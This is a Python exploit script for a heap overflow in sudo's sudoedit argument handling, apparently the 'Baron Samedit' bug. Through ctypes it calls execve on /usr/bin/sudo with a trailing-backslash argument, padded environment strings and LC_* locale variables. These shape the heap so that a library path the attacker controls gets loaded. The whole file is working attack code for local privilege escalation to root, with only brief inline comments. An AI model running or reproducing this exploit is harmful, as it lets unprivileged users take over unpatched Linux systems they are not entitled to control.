import os
import sys
import zlib
import base64
from ctypes import cdll, c_char_p, POINTER

# Implementation of libc.execve 
# argv and envp need to be list with last element=None

def execve(filename, argv, envp):
        
        libc = cdll.LoadLibrary("libc.so.6")
        libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)

        cargv = (c_char_p * len(argv))(*argv)
        cenvp = (c_char_p * len(envp))(*envp)

        libc.execve(filename, cargv, cenvp)

def exploit():

    offset = 1926
    # Random letter with some escape character used for reach the address that we want to overwrite
    payload = [b'\\'] * 24 + [b'ZZZZZZZ\\'] 
    # Some escape character and our malicious file path
    user_service = [b'\\'] * 24 + [b"X/X1234"]
    # Concat the payload with our user_service
    user_service = payload * 12 + user_service 
    
    # lc variable used for creating hole in the heap we use different letter for each variable so we can locate them
    lc = [b"LC_CTYPE=C.UTF-8@"+b'B'*40+b";A=", b"LC_NUMERIC=C.UTF-8@"+b'C'*216, b"LC_TIME=C.UTF-8@"+b'D'*40, b"LC_COLLATE=C.UTF-8@"+b'E'*40, None]

    
    # Arg and env for our execve 
    arg = [b"sudoedit", b"-A", b"-s", b'A' * 224 + b'\\', None]
    env = [b'B'* offset  + b'\\'] + user_service + lc 
    
    execve(b"/usr/bin/sudo", arg, env)



if __name__ == "__main__":
    exploit()
